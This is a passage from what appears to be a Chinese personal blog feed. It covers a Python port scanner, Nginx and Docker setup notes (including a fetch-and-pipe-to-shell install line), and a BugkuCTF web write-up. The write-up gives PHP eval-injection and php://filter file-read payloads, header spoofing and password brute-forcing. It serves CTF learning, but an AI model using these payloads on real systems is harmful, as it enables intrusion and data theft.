class="string">"-Pn"</span>):</span><br><span class="line">Pn = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Unhandled Option"</span></span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target:</span><br><span class="line"><span class="comment">#调用扫描</span></span><br><span class="line">portScan(target, ports)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">usage()</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">print</span> str(e)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line">usage()</span><br></pre></td></tr></table></figure><h2 id="socket扫描核心代码"><a href="#socket扫描核心代码" class="headerlink" title="socket扫描核心代码"></a>socket扫描核心代码</h2><p>socket扫描写都写了，懒得删了…emmmm<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">socket_scan</span><span class="params">(target, port)</span>:</span></span><br><span class="line"><span class="comment">#socket全连接</span></span><br><span class="line"><span class="keyword">global</span> socket_flag</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#设置超时</span></span><br><span class="line">conn.settimeout(<span class="number">2</span>)</span><br><span class="line">conn.connect((target, port))</span><br><span class="line">lock.acquire()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] %d/tcp open   %s\r'</span> % (port,port_list[port])</span><br><span class="line"><span class="comment">#计算开启的端口</span></span><br><span class="line">socket_flag = socket_flag + <span class="number">1</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="comment">#线程释放</span></span><br><span class="line">lock.release()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p><h2 id="syn扫描核心代码"><a href="#syn扫描核心代码" class="headerlink" title="syn扫描核心代码"></a>syn扫描核心代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syn_scan</span><span class="params">(ip,ports)</span>:</span></span><br><span class="line"><span class="comment">#构造数据包</span></span><br><span class="line">ans,unans=sr(IP(dst=ip)/TCP(dport=ports, flags=<span class="string">'S'</span>),timeout = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"PORT      STATE    SERVICE"</span></span><br><span class="line"><span class="keyword">for</span> snd,rcv <span class="keyword">in</span> ans:</span><br><span class="line"><span class="comment">#从返回包读取数据</span></span><br><span class="line">port = rcv.sprintf(<span class="string">"%IP.sport%"</span>)</span><br><span class="line">service = rcv.sprintf(<span class="string">"%TCP.sport%"</span>)</span><br><span class="line">flag = rcv.sprintf(<span class="string">"%TCP.flags%"</span>)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">'SA'</span>:</span><br><span class="line"><span class="comment">#SA是开放了端口</span></span><br><span class="line"><span class="keyword">if</span> is_number(service):</span><br><span class="line"><span class="comment">#包中信息的读取若为数字，调用字典查询可能的对应服务并替换</span></span><br><span class="line"><span class="keyword">if</span> service <span class="keyword">in</span> port_list.keys():</span><br><span class="line"> service = port_list[service]</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> service = <span class="string">'unknown'</span></span><br><span class="line"> <span class="comment">#格式化输出</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'%-10.5sopen     %s'</span> % (port,service)</span><br></pre></td></tr></table></figure><h2 id="扫描调用模块"><a href="#扫描调用模块" class="headerlink" title="扫描调用模块"></a>扫描调用模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#以逗号分割端口号</span></span><br><span class="line">ports = ports.split(<span class="string">","</span>)</span><br><span class="line"><span class="comment">#对string类型列表处理成int类型</span></span><br><span class="line">ports = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> ports]</span><br><span class="line"><span class="comment">#判断是socket扫描还是syn扫描</span></span><br><span class="line"><span class="keyword">if</span> socket_scan_mode:</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line"><span class="comment">#多线程调用socket</span></span><br><span class="line">thread = threading.Thread(target=socket_scan, args=(target, int(port)))</span><br><span class="line">thread.start()</span><br><span class="line"><span class="keyword">if</span> socket_flag == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"socket scan done!but no port is open"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#syn中整个列表传输执行比for循环更快</span></span><br><span class="line">syn_scan(target,ports)</span><br></pre></td></tr></table></figure><h2 id="实际结果展示"><a href="#实际结果展示" class="headerlink" title="实际结果展示"></a>实际结果展示</h2><p><img src="web-scan-2.png" alt=""><br><img src="web-scan-3.png" alt=""><br>还算可以，技术所限，大佬轻喷</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;准备事宜&quot;&gt;&lt;a href=&quot;#准备事宜&quot; class=&quot;headerlink&quot; title=&quot;准备事宜&quot;&gt;&lt;/a&gt;准备事宜&lt;/h2&gt;&lt;p&gt;scapy库&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://github.com/secdev/scapy.git&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; ./scapy&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;python setup.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;构思&quot;&gt;&lt;a href=&quot;#构思&quot; class=&quot;headerlink&quot; title=&quot;构思&quot;&gt;&lt;/a&gt;构思&lt;/h2&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://0xp1n3.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="https://0xp1n3.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>小站迁移记(Nginx自动化部署)</title>
    <link href="https://0xp1n3.github.io/2018/11/09/web-migration/"/>
    <id>https://0xp1n3.github.io/2018/11/09/web-migration/</id>
    <published>2018-11-09T10:24:07.000Z</published>
    <updated>2018-11-11T01:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSH部署阿里云vps"><a href="#SSH部署阿里云vps" class="headerlink" title="SSH部署阿里云vps"></a>SSH部署阿里云vps</h2><p>直接在阿里云控制台导入ssh-keygen生成的秘钥<br><a href="/2018/07/24/git-config/">秘钥生成看这里</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh git@serverip -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></p><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><a id="more"></a><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure><p>访问ip,看到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Welcome to nginx!</span><br></pre></td></tr></table></figure></p><p>配置成功了</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line"><span class="comment">#创建一个git用户,用于运行git服务</span></span><br><span class="line">sudo adduser git</span><br><span class="line"><span class="comment">#导入秘钥到</span></span><br><span class="line">/home/git/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#修改权限</span></span><br><span class="line">chmod 600 authorized_keys</span><br><span class="line"><span class="comment">#初始化git仓库</span></span><br><span class="line">git init --bare blo.git</span><br><span class="line"><span class="comment">#更改所有权</span></span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line"><span class="comment">#禁止shell登录</span></span><br><span class="line">修改/etc/passwd的git:x:1003:1003::/home/git:/bin/bash</span><br><span class="line">改为git:x:1003:1003::/home/git:/usr/bin/git-shell</span><br><span class="line"><span class="comment">#克隆远程仓库</span></span><br><span class="line">git <span class="built_in">clone</span> git@serverip:/home/git/blog.git</span><br></pre></td></tr></table></figure><h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><p>懒的配了,直接把html删了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> /home/git/blog.git html</span><br></pre></td></tr></table></figure></p><p>从仓库克隆过来直接替换掉</p><h2 id="配置Git钩子hooks"><a href="#配置Git钩子hooks" class="headerlink" title="配置Git钩子hooks"></a>配置Git钩子hooks</h2><p>blog.git文件家里有一个hooks文件夹<br>里边有各种hook例子<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim blog.git/hooks/post-receive</span><br></pre></td></tr></table></figure></p><p>写如下代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> GIT_DIR <span class="comment">#还原环境变量，否则会拉不到代码</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></p><p>注意要chmod 755 blog.git/hooks/post-receive</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>本地修改hexo配置文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment"># 部署到我的git仓库</span></span><br><span class="line">  repo: git@serverip:/home/git/blog.git</span><br><span class="line">  <span class="comment"># 分支默认master</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure></p><ul><li><a href="https://www.jianshu.com/p/59c4fc2684be" target="_blank" rel="noopener">ssh参考</a></li><li><a href="https://www.jianshu.com/p/7cb1a824333e" target="_blank" rel="noopener">nginx安装参考</a></li><li><a href="http://www.runoob.com/linux/nginx-install-setup.html" target="_blank" rel="noopener">nginx配置参考</a></li><li><a href="https://www.jianshu.com/p/0c939f63af41" target="_blank" rel="noopener">Git服务器搭建参考</a></li><li><a href="https://www.jianshu.com/p/a90d7ee90440" target="_blank" rel="noopener">详细参考</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSH部署阿里云vps&quot;&gt;&lt;a href=&quot;#SSH部署阿里云vps&quot; class=&quot;headerlink&quot; title=&quot;SSH部署阿里云vps&quot;&gt;&lt;/a&gt;SSH部署阿里云vps&lt;/h2&gt;&lt;p&gt;直接在阿里云控制台导入ssh-keygen生成的秘钥&lt;br&gt;&lt;a href=&quot;/2018/07/24/git-config/&quot;&gt;秘钥生成看这里&lt;/a&gt;&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh git@serverip -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;安装nginx&quot;&gt;&lt;a href=&quot;#安装nginx&quot; class=&quot;headerlink&quot; title=&quot;安装nginx&quot;&gt;&lt;/a&gt;安装nginx&lt;/h2&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0xp1n3.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://0xp1n3.github.io/tags/web/"/>
    
      <category term="vps" scheme="https://0xp1n3.github.io/tags/vps/"/>
    
      <category term="nginx" scheme="https://0xp1n3.github.io/tags/nginx/"/>
    
      <category term="ssh" scheme="https://0xp1n3.github.io/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Docker从入门到放弃</title>
    <link href="https://0xp1n3.github.io/2018/10/28/docker-1/"/>
    <id>https://0xp1n3.github.io/2018/10/28/docker-1/</id>
    <published>2018-10-29T06:00:17.000Z</published>
    <updated>2019-02-12T10:45:30.902Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/10/28/docker-1/docker-1-1.png" alt=""></p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><a id="more"></a><p>docker三大核心:</p><ul><li>镜像 -镜像不可写</li><li>容器 -容器基于镜像生成(可写)</li><li>仓库 -仓库存储镜像(类似于Git的管理机制)<br><img src="docker-1-2.png" alt=""></li></ul><h2 id="docker的安装"><a href="#docker的安装" class="headerlink" title="docker的安装"></a>docker的安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure><p>安装完后,将docker账户添加到sherdh用户组(非root)以便执行,然后登出再登录<br>否则会报no permission<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line">sudo service docker restart</span><br><span class="line">newgrp - docker</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试docker</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><p><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">菜鸟教程</a></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索镜像</span></span><br><span class="line">dicker search centos</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载镜像</span></span><br><span class="line">docker pull name</span><br><span class="line"></span><br><span class="line"><span class="comment"># -t 绑定伪终端 -i 保持标准输入 -d 后台运行 -p 端口映射</span></span><br><span class="line">docker run -t -i -p 1000:80 docker.io/centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展示所有镜像</span></span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存镜像</span></span><br><span class="line">docker save -o centos7.tar docker.io/centos</span><br><span class="line"></span><br><span class="line"><span class="comment"># 载入镜像</span></span><br><span class="line">docker load --input centos7.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存容器</span></span><br><span class="line">docker <span class="built_in">export</span> id &gt; name.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 载入容器成为镜像</span></span><br><span class="line">cat name.tar | docker import - sherdh/ubuntu:v1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看正在运行的容器(所有)</span></span><br><span class="line">docker ps （-a）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动/终止容器</span></span><br><span class="line">docker start/stop id (-i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除镜像</span></span><br><span class="line">docker rmi id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除容器</span></span><br><span class="line">docker rm id</span><br></pre></td></tr></table></figure><h2 id="那些折腾"><a href="#那些折腾" class="headerlink" title="那些折腾"></a>那些折腾</h2><h3 id="第一坑"><a href="#第一坑" class="headerlink" title="第一坑"></a>第一坑</h3><p>不要强制删除一个存在容器依赖的镜像<br>即 -f ,因为会产生各种莫名其妙的问题<br>先删除容器,如果容器在运行，需要先停止<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有容器</span></span><br><span class="line">docker ps -a</span><br><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure></p><h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><p>基于已有容器<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -a <span class="string">"sherdh"</span> -m <span class="string">"add a new file"</span> 容器id <span class="built_in">test</span>(新镜像名字)</span><br></pre></td></tr></table></figure></p><p>注意是容器id，不是镜像id</p><h3 id="加tag"><a href="#加tag" class="headerlink" title="加tag"></a>加tag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag <span class="built_in">test</span>:latest sherdh/<span class="built_in">test</span>:latest</span><br></pre></td></tr></table></figure><p>加了tag后，有两个同id的images<br>这时删除镜像报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error response from daemon: conflict: unable to delete c30eab908457 (must be forced) - image is referenced <span class="keyword">in</span> multiple repositories</span><br></pre></td></tr></table></figure></p><p>删除时需要指定名字，而不是id</p><h3 id="运行报错standard-init-linux-go-178-exec-user-process-caused-“exec-format-error”"><a href="#运行报错standard-init-linux-go-178-exec-user-process-caused-“exec-format-error”" class="headerlink" title="运行报错standard_init_linux.go:178: exec user process caused “exec format error”"></a>运行报错standard_init_linux.go:178: exec user process caused “exec format error”</h3><p>查到原因是docker不支持32位ubuntu…<br>乖乖重装系统去</p><h2 id="使用dockerfile创建镜像"><a href="#使用dockerfile创建镜像" class="headerlink" title="使用dockerfile创建镜像"></a>使用dockerfile创建镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER PinE sherdh@gmail.com</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">"deb http://archive.ubuntu.com/ubuntu/ raring main universe"</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y nginx inotify-tools apache2 openssh-server</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">"\ndaemon off;"</span> &gt;&gt; /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自启动</span></span><br><span class="line">RUN bash -c <span class="string">'echo "firefox" &gt;&gt; /.bashrc'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开端口</span></span><br><span class="line">EXPOSE 5900</span><br><span class="line"></span><br><span class="line"><span class="comment"># 容器启动执行的命令</span></span><br><span class="line">CMD /usr/sbin/nginx</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/10/28/docker-1/docker-1-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h2&gt;
    
    </summary>
    
      <category term="杂七杂八" scheme="https://0xp1n3.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="docker" scheme="https://0xp1n3.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>BugkuCTF-write-up(WEB题)</title>
    <link href="https://0xp1n3.github.io/2018/09/28/BugkuCTF-write-up/"/>
    <id>https://0xp1n3.github.io/2018/09/28/BugkuCTF-write-up/</id>
    <published>2018-09-29T03:59:43.000Z</published>
    <updated>2018-11-09T21:47:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>先放出bugkuctf网址:<a href="http://ctf.bugku.com/" target="_blank" rel="noopener">click me</a></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><a id="more"></a><p>进去一大片的滑稽,速度还越来越快<br>f12看一下，嗯，得flag</p><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>要求输入两个一百以内数字相加的结果，输入框限了长度<br>审查元素更改maxlength,提交得flag</p><h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>显示了以下代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_GET</span>[<span class="string">'what'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">'flag'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure></p><p>用get传值what=flag</p><h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$what</span>=<span class="variable">$_POST</span>[<span class="string">'what'</span>];</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$what</span>==<span class="string">'flag'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure><p>打开hackbar<br>post数据what=flag</p><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求num=1却不是数字<br>php特性，提交1a (随便加个字母)</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>无限弹窗flag就在这里…<br><img src="BugkuCTF-web3.png" alt=""><br>抓包看一下<br>html实体编码，解一下</p><h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>hint:听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag<br>之前是自己傻x了….<br>/etc/hosts 里加个123.206.87.240 flag.bugku.com就好了</p><h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>疯狂刷新…..<br><img src="BugkuCTF-stop.png" alt=""><br>抓包拦截<br>得flag</p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>); </span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造闭合符号就好了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=); show_source(flag.php</span><br></pre></td></tr></table></figure></p><p>没反应，尴尬<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=); <span class="built_in">print</span>(flag.php</span><br></pre></td></tr></table></figure></p><p>测试一下<br>输出了flagphp，wtf？过滤了.<br>换个思路<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello=);print_r(file(<span class="string">"flag.php"</span>)</span><br></pre></td></tr></table></figure></p><h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以为又是绕过，耗了好些时间….后来发现$$<br>php全局变量GLOBALS，$GLOBALS可以调用，果断?args=GLOBALS<br>get it</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>hint1:jspfuck<br>hint2:大写<br>f12看到<br><img src="BugkuCTF-web5.png" alt=""><br>是jsfuck，控制台黏贴回车</p><h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>什么也没有？？？<br>抓包看看,有点意思flag在消息头</p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>嗯..一个黑页，翻了翻什么都没有<br>上目录扫描器(我这里用dirsearch)用御剑的人会比较多<br><img src="BugkuCTF-webshell-dirsearch.png" alt=""><br>扫到个马,先访问看看，要输密码，随便输一个试试<br>提示不是自己的马不要乱骑…有点意思<br>拿burp挂个字典直接爆破…<br><img src="BugkuCTF-hack.png" alt=""></p><h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>登录框emmmm,试试万能密码<br><img src="BugkuCTF-1003.png" alt=""><br>记录ip，还真有点小怕怕呢~<br>插个X-Forwarded-For: 123.206.31.85<br>不报禁止访问了，然后?卡了一会，f12看一下<br>有个注释<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dGVzdDEyMw==</span><br></pre></td></tr></table></figure></p><p>是base64，解码test123<br>目测是密码，那用户名呢?admin?root?administrator?<br>都不是?<br>不对，换个思路，改X-Forwarded-For: 192.168.1.1<br>再改127.0.0.1<br>成了，咋就忘了这个呢….尴尬</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p><img src="BugkuCTF-web4.png" alt=""><br>usl解码看看，乱七八糟，理一下格式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkSubmit</span></span>()&#123;</span><br><span class="line">var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="built_in">return</span>!0;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="built_in">return</span>!1</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(unescape(p1) + unescape(<span class="string">'%35%34%61%61%32'</span> + p2));</span><br></pre></td></tr></table></figure></p><p>手动拼接再解码<br>提交67d709b2b54aa2aa648cf6e87a7114f1</p><h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>click me.<br>点之，跳转url有东西<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=show.php</span><br></pre></td></tr></table></figure></p><p>是文件包含，直接filter协议读<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>看到了’//flag:flag{edulcni_elif_lacol_si_siht}’</p><h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>120.24.86.145:8002/baopo/<br>既然都写得这么明明白白的爆破了那就爆破吧<br>五位数数字，要不了多久<br>第一次没爆出来？？？是自己傻逼了，调了5递增…<br>再爆一次<br><img src="BugkuCTF-baopo.png" alt=""></p><h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>hints:javascript<br><img src="BugkuCTF-onebillion.png" alt=""><br>f12看一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var clicks=0</span><br><span class="line">$(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">  $(<span class="string">"#cookie"</span>)</span><br><span class="line">    .mousedown(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .mouseup(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">      clicks++;</span><br><span class="line">      $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">      <span class="keyword">if</span>(clicks &gt;= 1000000)&#123;</span><br><span class="line">        var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">        $(<span class="string">'body'</span>).append(form);</span><br><span class="line">        form.submit();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span 